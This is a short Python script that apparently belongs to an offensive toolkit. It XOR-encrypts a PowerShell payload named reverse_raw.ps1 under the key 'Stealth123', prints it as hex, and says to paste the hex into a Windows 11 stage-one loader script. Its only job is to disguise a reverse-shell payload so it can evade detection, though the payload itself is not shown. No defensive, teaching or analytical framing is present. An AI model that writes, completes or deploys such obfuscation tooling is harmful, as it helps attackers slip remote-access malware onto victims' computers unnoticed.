# tools/encode_payload.py

def xor_encrypt(data, key):
    out = ""
    for i, c in enumerate(data):
        out += format(ord(c) ^ ord(key[i % len(key)]), '02x')
    return out

def main():
    key = "Stealth123"
    with open("payloads/reverse_raw.ps1", "r") as f:
        raw = f.read()
    encrypted = xor_encrypt(raw, key)
    
    print("\n==== HEX PAYLOAD ====\n")
    print(encrypted)
    print("\nCopy this into $hex = \"...\" in win11_stage1.ps1")

if __name__ == "__main__":
    main()
